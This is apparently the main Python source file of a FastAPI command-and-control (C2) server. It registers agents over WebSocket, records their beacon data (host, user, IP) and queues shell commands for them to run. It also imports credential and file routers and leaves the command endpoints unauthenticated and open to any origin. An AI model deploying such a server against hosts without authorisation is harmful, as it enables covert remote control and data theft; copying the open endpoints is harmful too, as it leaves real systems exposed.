"""C2 Server Main Application"""

from fastapi import FastAPI, WebSocket, WebSocketDisconnect, status, Body
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
from contextlib import asynccontextmanager
import logging
import json
from datetime import datetime

from app.database import init_db, close_db
from app.api import auth, sessions, agents, commands, monitoring, files, credentials
from app.agent_manager import agent_manager

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@asynccontextmanager
async def lifespan(app: FastAPI):
    """Application lifespan management"""
    # Startup
    logger.info("C2 Server starting...")
    try:
        await init_db()
        logger.info("Database initialized")
    except Exception as e:
        logger.error(f"Database initialization failed: {e}")
        logger.warning("Server will continue without database (live WebSocket agents still work)")
    yield
    # Shutdown
    logger.info("C2 Server shutting down...")
    try:
        await close_db()
        logger.info("Database connections closed")
    except Exception as e:
        logger.error(f"Shutdown error: {e}")

# Create FastAPI app
app = FastAPI(
    title="C2 Server API",
    description="Secure Remote Administration Framework",
    version="0.1.0",
    docs_url="/api/docs",
    openapi_url="/api/openapi.json",
    lifespan=lifespan
)

# CORS Configuration
origins = [
    "http://localhost:3000",
    "http://localhost:5173",
    "http://127.0.0.1:3000",
    "http://127.0.0.1:5173",
    "*",
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Include routers
app.include_router(auth.router, prefix="/api")
app.include_router(sessions.router, prefix="/api")
app.include_router(agents.router, prefix="/api")
app.include_router(commands.router, prefix="/api")
app.include_router(monitoring.router, prefix="/api")
app.include_router(files.router, prefix="/api")
app.include_router(credentials.router, prefix="/api")


# ============ Health & Status Endpoints ============

@app.get("/health")
async def health_check():
    """Health check endpoint"""
    return {
        "status": "healthy",
        "version": "0.1.0",
        "timestamp": datetime.utcnow().isoformat(),
        "live_agents": len(agent_manager.active_connections),
    }


@app.get("/")
async def root():
    """Root endpoint"""
    return {
        "message": "C2 Server is operational",
        "docs": "/api/docs",
        "api_version": "0.1.0",
        "live_agents": len(agent_manager.active_connections),
    }


@app.get("/api/status")
async def api_status():
    """API status endpoint"""
    return {
        "status": "operational",
        "version": "0.1.0",
        "timestamp": datetime.utcnow().isoformat(),
        "components": {
            "database": "connected",
            "auth": "operational",
            "sessions": "operational",
            "websocket": "operational",
        },
        "live_agents": len(agent_manager.active_connections),
    }


# ============ WebSocket Endpoints ============

@app.websocket("/ws/agent/{agent_id}")
async def websocket_agent_endpoint(websocket: WebSocket, agent_id: str):
    """WebSocket endpoint for agent communication"""
    await agent_manager.connect(agent_id, websocket)
    logger.info(f"Agent {agent_id} connected via WebSocket")

    try:
        while True:
            data = await websocket.receive_text()
            logger.info(f"Received from {agent_id}: {len(data)} bytes")

            # Try to parse as encrypted envelope
            try:
                envelope = json.loads(data)
                if "v" in envelope and "data" in envelope:
                    agent_manager.log_beacon(agent_id, envelope)
                    agent_manager.update_agent_info(agent_id, {
                        "last_envelope_version": envelope.get("v"),
                        "last_message_index": envelope.get("idx"),
                        "encryption": "active",
                    })
                    logger.info(
                        f"Agent {agent_id}: encrypted envelope v{envelope.get('v')}, "
                        f"idx={envelope.get('idx')}, data_size={len(envelope.get('data', ''))}"
                    )
                elif "msg_type" in envelope:
                    # Plaintext message (debug mode)
                    msg_type = envelope.get("msg_type", "unknown")
                    agent_manager.update_agent_info(agent_id, {
                        "encryption": "none (debug)",
                        "last_msg_type": msg_type,
                    })
                    if msg_type == "BEACON" and "payload" in envelope:
                        try:
                            beacon = json.loads(envelope["payload"])
                            agent_manager.update_agent_info(agent_id, {
                                "hostname": beacon.get("hostname"),
                                "os": beacon.get("os"),
                                "os_version": beacon.get("os_version"),
                                "architecture": beacon.get("architecture"),
                                "user": beacon.get("user"),
                                "ip_address": beacon.get("ip_address"),
                            })
                        except (json.JSONDecodeError, TypeError):
                            pass
                    logger.info(f"Agent {agent_id}: plaintext {msg_type}")
                else:
                    logger.warning(f"Agent {agent_id}: unknown message format")
            except json.JSONDecodeError:
                logger.warning(f"Agent {agent_id}: non-JSON data ({len(data)} bytes)")

            # Check for pending commands
            pending = agent_manager.get_pending_commands(agent_id)
            if pending:
                for entry in pending:
                    cmd = entry["command"]
                    response = {
                        "type": "command",
                        "timestamp": datetime.utcnow().isoformat(),
                        "data": cmd,
                    }
                    await websocket.send_text(json.dumps(response))
                    logger.info(f"Sent command to {agent_id}: {json.dumps(cmd)[:100]}")
            else:
                ack = {
                    "type": "ack",
                    "status": "ok",
                    "timestamp": datetime.utcnow().isoformat(),
                }
                await websocket.send_text(json.dumps(ack))

    except WebSocketDisconnect:
        logger.info(f"Agent {agent_id} disconnected (clean)")
    except Exception as e:
        logger.error(f"WebSocket error for {agent_id}: {e}")
    finally:
        agent_manager.disconnect(agent_id)


@app.websocket("/ws/monitoring")
async def websocket_monitoring_endpoint(websocket: WebSocket):
    """WebSocket endpoint for real-time monitoring"""
    await websocket.accept()
    logger.info("Monitoring client connected")

    try:
        while True:
            data = await websocket.receive_text()
            logger.debug(f"Monitoring request: {data[:100]}...")

            await websocket.send_json({
                "type": "status",
                "timestamp": datetime.utcnow().isoformat(),
                "live_agents": agent_manager.get_active_agents(),
            })
    except WebSocketDisconnect:
        logger.info("Monitoring client disconnected (clean)")
    except Exception as e:
        logger.error(f"Monitoring WebSocket error: {e}")
    finally:
        logger.info("Monitoring client disconnected")


# ============ Live Agent API (no auth, for testing) ============

@app.get("/api/live/agents")
async def get_live_agents():
    """Get currently connected agents via WebSocket"""
    return {
        "total": len(agent_manager.active_connections),
        "agents": agent_manager.get_active_agents(),
    }


@app.get("/api/live/agents/{agent_id}")
async def get_live_agent(agent_id: str):
    """Get details for a specific connected agent"""
    if not agent_manager.is_connected(agent_id):
        return JSONResponse(
            status_code=404,
            content={"detail": f"Agent {agent_id} is not connected"}
        )
    info = agent_manager.agent_info.get(agent_id, {})
    info["agent_id"] = agent_id
    info["pending_commands"] = len(agent_manager.command_queues.get(agent_id, []))
    info["total_beacons"] = len(agent_manager.beacon_log.get(agent_id, []))
    info["recent_beacons"] = agent_manager.beacon_log.get(agent_id, [])[-5:]
    return info


@app.post("/api/live/agents/{agent_id}/command")
async def send_command_to_agent(agent_id: str, command: dict = Body(...)):
    """Queue a command for a connected agent.

    Example body:
        {"command_type": "shell", "command": "whoami"}
        {"command_type": "execute", "program": "ls", "args": ["-la"]}
    """
    if not agent_manager.is_connected(agent_id):
        return JSONResponse(
            status_code=404,
            content={"detail": f"Agent {agent_id} is not connected"}
        )

    agent_manager.queue_command(agent_id, command)
    return {
        "status": "queued",
        "agent_id": agent_id,
        "command": command,
        "queue_size": len(agent_manager.command_queues.get(agent_id, [])),
    }


@app.get("/api/live/agents/{agent_id}/beacons")
async def get_agent_beacons(agent_id: str):
    """Get beacon history for an agent"""
    beacons = agent_manager.beacon_log.get(agent_id, [])
    return {
        "agent_id": agent_id,
        "total": len(beacons),
        "beacons": beacons[-50:],
    }


# ============ Error Handlers ============

@app.exception_handler(Exception)
async def global_exception_handler(request, exc):
    """Global exception handler"""
    logger.error(f"Unhandled exception: {exc}")
    return JSONResponse(
        status_code=500,
        content={"detail": "Internal server error"}
    )


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(
        app,
        host="0.0.0.0",
        port=8000,
        reload=True,
        log_level="info"
    )
